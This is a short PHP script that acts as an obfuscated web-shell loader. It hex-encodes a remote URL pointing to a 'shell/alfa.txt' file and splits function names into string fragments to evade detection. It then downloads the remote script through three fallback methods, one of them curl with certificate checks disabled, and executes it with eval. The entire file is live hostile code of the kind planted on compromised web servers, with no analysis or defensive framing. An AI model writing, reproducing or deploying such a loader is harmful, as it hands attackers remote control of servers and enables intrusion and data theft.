<?php
$hexUrl = '68747470733a2f2f6879706f637269746573656f2e696e666f2f7368656c6c2f616c66612e747874';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadWithFileGetContents($url) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents($url);
    }
    return false;
}

function downloadWithCurl($url) {
    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

function downloadWithFopen($url) {
    $result = false;
    if ($fp = fopen($url, 'r')) {
        $result = '';
        while ($data = fread($fp, 8192)) {
            $result .= $data;
        }
        fclose($fp);
    }
    return $result;
}

$phpScript = downloadWithFileGetContents($url);
if ($phpScript === false) {
    $phpScript = downloadWithCurl($url);
}
if ($phpScript === false) {
    $phpScript = downloadWithFopen($url);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);
?>
